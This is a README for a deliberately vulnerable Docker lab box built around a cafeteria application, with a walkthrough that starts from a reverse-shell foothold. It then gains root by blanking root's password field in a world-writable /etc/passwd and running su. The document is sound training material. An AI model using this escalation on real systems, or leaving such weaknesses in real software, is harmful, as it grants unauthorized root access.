# Kaindorf Cafeteria Server

## Introduction

The purpose of this repository is to provide a simple installation for a container that serves the [Kaindorf Cafeteria Application](https://github.com/FloDevAT/Kaindorf-Cafeteria).

## How to Setup

### Requirements

- Docker

### Installation

Since the whole server is deployed inside a single Docker container, it is very easy to install, run, and replace any of the services.

To make the process easier, there is a single `run.sh` file in the repository that executes all the required steps. If you are unable to execute this file for some reason, you can always copy the commands and execute them manually.

The container installs a basic set of tools common in many Linux installations. It also instantly runs the `config.sh` file, which makes the box vulnerable, creates the `noob` user, and runs the application with it.

The container runs within a specific Docker network and assigns it a static IP address, making it easier to demonstrate. However, this configuration is not required for the box to function, so feel free to modify or remove it as needed. For deploying the reverse shell, ensure you check for the correct configuration.

## How to Root the Box

The description of how to exploit the application can be found in its [repository](https://github.com/FloDevAT/Kaindorf-Cafeteria). For this tutorial, I will continue from the initial foothold of a "noob" reverse shell:

```bash
sh-5.2$ id
uid=1000(noob) gid=1000(noob) groups=1000(noob)
```

After some investigation, you may discover that the `/etc/passwd` file is editable by all users (including our `noob` user). This allows us to modify the line for the root user as follows:

```plaintext
root::0:0:root:/root:/bin/bash
```

(Note: We removed the `x` in the second field.)

Now, you can switch to the root user without entering a password:

```bash
sh-5.2$ su root
```

And that's it! We now have a root shell:

```bash
root@cad7035e8cb6:/# id
uid=0(root) gid=0(root) groups=0(root)
